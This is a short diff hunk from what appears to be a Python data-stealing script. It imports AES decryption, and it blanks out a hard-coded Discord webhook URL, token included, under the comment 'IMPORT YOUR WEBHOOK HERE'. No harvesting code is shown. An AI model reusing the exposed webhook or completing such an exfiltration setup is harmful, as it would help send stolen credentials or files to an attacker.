@@ -11,7 +11,7 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 
-webhook_url = "https://discord.com/api/webhooks/1135480748778991660/72ArREPI--B86-YHpReIQNLP5yiJpiRfnabK4xXnWJwRJIu0IGIvSpsK-lD4AlqRxU6k"    # NOTE: IMPORT YOUR WEBHOOK HERE
+webhook_url = ""    # NOTE: IMPORT YOUR WEBHOOK HERE
 webhook = ""
 CUR_DIR = os.getcwd()
 
